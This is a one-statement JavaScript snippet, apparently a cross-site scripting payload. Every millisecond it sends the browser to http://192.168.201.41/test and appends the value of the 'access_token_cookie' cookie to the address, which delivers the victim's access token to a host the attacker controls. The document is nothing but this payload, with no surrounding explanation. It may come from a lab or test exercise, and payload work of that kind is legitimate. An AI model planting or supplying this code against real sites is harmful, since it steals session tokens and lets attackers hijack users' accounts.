setInterval(function() {  
  document.location = "http://192.168.201.41/test" + getCookie("access_token_cookie")
}, 1);

